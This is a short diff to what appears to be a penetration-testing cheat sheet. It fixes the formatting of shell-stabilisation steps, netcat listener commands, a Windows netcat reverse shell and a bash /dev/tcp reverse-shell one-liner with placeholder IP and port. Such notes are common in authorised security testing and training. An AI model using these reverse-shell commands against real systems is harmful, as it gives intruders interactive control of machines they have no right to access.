@@ -16,7 +16,7 @@ Background the shell with <code>Ctrl+Z</code>
 
 <code>stty raw echo</code>
 
-<code>fg</code> 
+Foreground the shell with <code>fg</code> 
 
 Hit Return 2x
 
@@ -24,7 +24,7 @@ Hit Return 2x
 
 Linux: <code>nc -lnvp [PORT]</code>
 
-Windows: <code>nc.exe -lnvcp [PORT]
+Windows: <code>nc.exe -lnvcp [PORT]</code>
 
 ## Reverse Shells
 
@@ -36,7 +36,7 @@ Windows: <code>nc.exe -nv [IP] [PORT] -e cmd.exe</code>
 
 ### Bash One-Liners
 
-<code> 0ge&118-;exec 118gele/dev/tcp/[IP]/[PORT];sh ge&118 le&118 2le&118</code>
+<code> 0<&118-;exec 118<>/dev/tcp/[IP]/[PORT];sh <&118 >&118 2>&118</code>
 
 ## NMAP
 
